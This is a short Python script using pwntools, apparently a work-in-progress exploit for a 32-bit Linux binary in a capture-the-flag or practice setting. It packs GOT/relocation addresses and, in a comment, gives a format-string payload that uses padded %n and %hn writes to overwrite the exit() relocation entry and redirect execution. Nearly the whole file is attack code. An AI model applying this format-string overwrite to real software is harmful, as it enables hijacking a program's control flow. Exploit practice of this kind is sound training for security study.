# -*- coding: utf-8 -*-
from pwn import *
import struct

context(arch ='i386', os ='linux')

# exit() reloc address to write 080499b7
printf_addr = struct.pack("<I", 0x0080499b7)

# target addr
target = struct.pack("<I", 0x080499ac)

# gdb-peda$ r < <(python -c 'print "\xb7\x99\x04\x08" + "\x41" * 4 + "\xb8\x99\x04\x08" + "\x41" * 4 + "\xb9\x99\x04\x08" + "\x41" * 4 + "\xba\x99\x04\x08" + "%08x"*6 + "%68x%n%161x%n%46773x%hn"')

